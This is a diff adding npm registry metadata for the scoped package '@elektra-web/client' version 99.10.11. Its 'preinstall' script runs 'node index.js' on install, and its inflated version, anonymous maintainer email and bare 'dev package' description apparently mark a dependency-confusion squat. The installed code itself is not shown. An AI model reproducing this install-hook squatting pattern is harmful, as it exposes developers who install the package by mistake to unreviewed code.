@@ -1,0 +1,62 @@
+{
+    "_id": "@elektra-web/client",
+    "name": "@elektra-web/client",
+    "dist-tags": {
+        "latest": "99.10.11"
+    },
+    "versions": {
+        "99.10.11": {
+            "name": "@elektra-web/client",
+            "version": "99.10.11",
+            "description": "dev package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "@elektra-web/client@99.10.11",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-eeorUIjeaOceCIcQS7k5vnBtn58lAtqVFRZ7VVXsUwLnOaZvunHKUjDznwVXuyFGEfQM1bC6AFz2vjdvz+X80g==",
+                "shasum": "c4a0d22468dc83e80130fca52bdf326fb99df04e",
+                "tarball": "https://registry.npmjs.org/@elektra-web/client/-/client-99.10.11.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5070,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNzPyACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp0wxAAjth+YVRnV1GS9Z2troVc5xSzkp6g/lbX51Nr9IGAyZwdaulg\r\n94xkFObHCeeffUvELbVAub+TC4AFZLvOTgmaYW4i77vzgs+cxk7rV75ZtRh1\r\nK/sIwoHW0uh3h57r5dbkPz+IohCIhCMyTekcUzkeFtk7iwppkVTFXpEiiZvl\r\nQX8HCrdA7WTGxo5HRE/BcbHjCOT+oW50qR546hKIavtaThRsu2ZV0EWKAahI\r\neFPEmTgjx4EPIraosKL+kLkPMtMDde0weCL+/y/G4/64sh8twbuN9B6P7KZn\r\nBjW4Zz9TsFWlCMA+Rf5a2XQ6IZFKQh4vbdiT0LqHsTO4ogg4/eqJmg7gdpki\r\nKbeTrJxRUnqnChlC1ps6MLiTqnxAvcTwJre6aVz05ZNdrVjESO91+2PA1cS5\r\n7uM/k7RTcwOBmm/X0WAUz1qmAwxmR5EDBecvhbPXPqU4rY+wthdZldK9EPnt\r\n8dGqYUcXPiiW0TQH3mz2nn7Xo0BR+pWW81Uc8hjfHdd0M1SWm+JW3a81gjEr\r\n0UI6dw1BHb0e+zJDVKbVg5JeoOkfiGvqDxVPJY/m+dN2Xv3C6/9a8/MhBk3V\r\nfjtSRNtyoifZHFcKG6uK8am1HcpyMt7HaF9JMSHuaLhO/bgyvTwg8sawYN3l\r\n1dedtaWHPz9qqIcHY/bCZg6XGOTbI05jkdI=\r\n=YSZD\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "elektra-web",
+                "email": "elektra-web@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "elektra-web",
+                    "email": "elektra-web@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/client_99.10.11_1647784946168_0.21610253183741257"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T14:02:26.085Z",
+        "99.10.11": "2022-03-20T14:02:26.308Z",
+        "modified": "2022-03-20T14:02:26.416Z"
+    },
+    "maintainers": [
+        {
+            "name": "elektra-web",
+            "email": "elektra-web@rt11.33mail.com"
+        }
+    ],
+    "description": "dev package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
